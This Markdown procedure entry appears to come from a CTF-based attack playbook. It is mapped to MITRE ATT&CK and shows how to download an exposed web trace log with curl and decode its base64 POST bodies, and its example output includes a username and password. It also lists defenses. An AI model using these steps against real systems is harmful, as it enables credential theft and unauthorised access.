---
tags:
  - information-disclosure
  - credential-leak
  - base64-decode
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-download-log]]'
  - '[[commands/awk-decode-base64]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:33:06.060Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 4ee9c5d5-b3a0-4dbf-8bb0-3821095c29a0
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Extract Credentials from Exposed Logs

## Summary

This procedure downloads and decodes a publicly accessible log file identified from leaked source code, extracting base64-encoded sensitive data such as login credentials for initial access.

## Description

After reviewing logger.php from the exposed Git repo, the procedure targets bp_web_trace.log, which logs base64-encoded POST requests including credentials. Decoding reveals JSON payloads with usernames and passwords, enabling authentication without brute-forcing.

## Requirements

1. Access to the exposed log URL: https://app.bountypay.h1ctf.com/bp_web_trace.log
2. Tools: curl, awk, base64 decoder (standard Unix tools)
3. Knowledge of the logging format from source code review

## Defense

Defensive measures and detection strategies:

- Restrict log file access to authenticated users only
- Avoid logging sensitive data like credentials, even encoded
- Implement log rotation and monitoring for unauthorized downloads

## Objectives

1. Download raw log content
2. Parse and decode base64 entries to extract credentials
3. Validate credentials for use in authentication

## Instructions

### Step 1: Download the Log File

**Context**: Fetch the raw log containing encoded payloads.

**Command** ([[commands/curl-download-log]]):
```bash
curl https://app.bountypay.h1ctf.com/bp_web_trace.log -o bp_web_trace.log
```

> Downloads the file locally. Expected output: Raw text with lines like 'POST:/:base64payload'.

### Step 2: Decode Base64 Payloads

**Context**: Extract and decode the payloads after the ':' separator.

**Command** ([[commands/awk-decode-base64]]):
```bash
curl -s https://app.bountypay.h1ctf.com/bp_web_trace.log | awk -F ':' '{print $2}' | while read line; do echo "$line" | base64 --decode && echo "\n"; done
```

> Silent curl pipes to awk for field splitting, then decodes each line. Expected output: Decoded JSON like {"username":"brian.oliver","password":"V7h0inzX"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-download-log]]
- [[commands/awk-decode-base64]]

## Tools Used

None specific beyond standard utilities.

## Tags

- information-disclosure
- credential-leak
- base64-decode
